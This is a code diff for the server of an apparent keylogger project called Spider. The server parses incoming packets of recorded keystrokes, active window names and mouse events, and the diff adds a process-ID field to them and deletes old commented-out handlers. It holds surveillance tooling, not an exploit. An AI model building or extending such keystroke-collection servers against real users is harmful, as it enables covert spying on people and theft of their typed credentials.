@@ -70,9 +70,14 @@ void			Spider::doFirstConnection()
 	    std::cerr << e.what() << std::endl;
 	  }
 
-	  char *reponse = new char;
-	  reponse[0] = 1;
-	  _socket->async_write(reponse, 1, [this, reponse]() mutable {
+	  uint16_t	*reponse = new uint16_t;
+
+	  *reponse = 2 << 8 | 2;
+
+	  // char *reponse = new char[2];
+	  // reponse[0] = 2;
+	  // reponse[1] = 2;
+	  _socket->async_write(reponse, 2, [this, reponse]() mutable {
 	      delete reponse;
 	      boost::asio::spawn(_web.get_ioservice(), [this](boost::asio::yield_context yield) {
 		  getTypeInfo(yield);
@@ -94,7 +99,6 @@ void			Spider::getTypeInfo(boost::asio::yield_context yield)
     }
 
     id = _buffer.getValue<uint8_t>();
-    std::cout << "ID: " << (int)id << std::endl;
     switch (id)
     {
     case (Paquet::KEYSTROKES):
@@ -122,11 +126,12 @@ void			Spider::getKeystrokes(boost::asio::yield_context &yield)
   uint16_t		sizeText = 0;
   PaquetKeys		paquet;
 
-  if (_socket->async_read(_buffer.data(), 6, yield)) {
+  if (_socket->async_read(_buffer.data(), 8, yield)) {
     return ;
   }
   _buffer.reset();
   paquet.setDate(_buffer.getValue<uint32_t>());
+  paquet.setPid(_buffer.getValue<uint16_t>());
   if ((sizeActive = _buffer.getValue<uint16_t>()) >= SIZE_STRING) {
     DEBUG_MSG("Wrong string size allowed");
     return ;
@@ -184,12 +189,13 @@ void			Spider::getMouse(boost::asio::yield_context &yield)
   uint16_t		sizeActive = 0;
   PaquetMouse		paquet;
 
-  if (_socket->async_read(_buffer.data(), 6, yield)) {
+  if (_socket->async_read(_buffer.data(), 8, yield)) {
     return ;
   }
 
   _buffer.reset();
   paquet.setDate(_buffer.getValue<uint32_t>());
+  paquet.setPid(_buffer.getValue<uint16_t>());
   sizeActive = _buffer.getValue<uint16_t>();
 
   _buffer.reset();
@@ -255,115 +261,3 @@ void			Spider::getClientCMD(boost::asio::yield_context &yield)
 #endif // !DEBUG
 
 }
-
-// void			Spider::getMouse
-// {
-//   uint16_t		sizeActive = 0;
-//   PaquetMouse		paquet;
-
-//   _socket->async_read2(_buffer.data(), 6, yield);
-// //  _buffer.reset();
-//   paquet.setDate(_buffer.getValue<uint32_t>());
-//   sizeActive = _buffer.getValue<uint16_t>();
-//   _buffer.reset();
-//   _socket->async_read(_buffer.data(), sizeActive, [this, &paquet, &sizeActive]() {
-//       _buffer.getValue<char>(_str, sizeActive);
-//       paquet.setActive(_str);
-
-//       _buffer.reset();
-//       _socket->async_read(_buffer.data(), 5, [this, &paquet]() {
-// 	  paquet.setX(_buffer.getValue<uint16_t>());
-// 	  paquet.setY(_buffer.getValue<uint16_t>());
-// 	  paquet.setButton(_buffer.getValue<uint8_t>());
-// 	  paquet.createPaquet();
-
-// #ifdef DEBUG
-// 	  std::cerr << paquet << std::endl;
-// #endif // !DEBUG
-
-// 	  try {
-// 	    _json->writePaquetMouse(&paquet);
-// 	  }
-// 	  catch (const std::exception &e) {
-// 	    std::cerr << e.what() << std::endl;
-// 	  }
-
-// //	  getTypeInfo();
-// 	});
-//     });
-// }
-
-// void			Spider::getKeystrokes()
-// {
-//   std::cout << "ICIIIIIIIIIIIIII\n";
-//   uint16_t		sizeActive = 0;
-//   uint16_t		sizeText = 0;
-//   boost::shared_ptr<PaquetKeys>		paquet(new PaquetKeys);
-
-//   _buffer.reset();
-//   paquet->setDate(_buffer.getValue<uint32_t>());
-//   sizeActive = _buffer.getValue<uint16_t>();
-
-//   _buffer.reset();
-//   _socket->async_read(_buffer.data(), sizeActive, [this, paquet, sizeActive, sizeText]() {
-
-//       if (sizeActive) {
-// 	memset(_str, 0, SIZE_STRING);
-// 	_buffer.getValue<char>(_str, sizeActive);
-// 	paquet->setActive(_str);
-//       }
-
-//       _buffer.reset();
-//       _socket->async_read(_buffer.data(), 2, [this, paquet, sizeActive, sizeText]() mutable {
-// 	  sizeText = _buffer.getValue<uint16_t>();
-
-// 	  _buffer.reset();
-// 	  _socket->async_read(_buffer.data(), sizeText, [this, paquet, sizeText]() {
-
-// 	      memset(_str, 0, SIZE_STRING);
-// 	      _buffer.getValue<char>(_str, sizeText);
-
-// 	      paquet->setText(_str);
-// 	      paquet->createPaquet();
-
-
-// #ifdef DEBUG
-// 	      std::cerr << *paquet << std::endl;
-// #endif // !DEBUG
-
-// 	      try {
-// //		_json->writePaquetKeys(&paquet);
-// 	      }
-// 	      catch (const std::exception &e) {
-// 		std::cerr << e.what() << std::endl;
-// 	      }
-
-// //	      getTypeInfo();
-// 	    });
-// 	});
-//     });
-// }
-
-// void			Spider::getClientCMD()
-// {
-//   uint16_t		sizeData = 0;
-//   PaquetCommandClient	paquet;
-
-// //  _buffer.reset();
-//   paquet.setOk(_buffer.getValue<uint8_t>());
-//   sizeData = _buffer.getValue<uint16_t>();
-//   _buffer.reset();
-//   _socket->async_read(_buffer.data(), sizeData, [this, &paquet, &sizeData]() {
-//       _buffer.getValue<char>(_str, sizeData);
-//       paquet.setDataReponse(_str);
-//       paquet.createPaquet();
-
-// #ifdef DEBUG
-//       std::cerr << paquet << std::endl;
-// #endif // !DEBUG
-
-//       // ICI
-
-// //      getTypeInfo();
-//     });
-// }
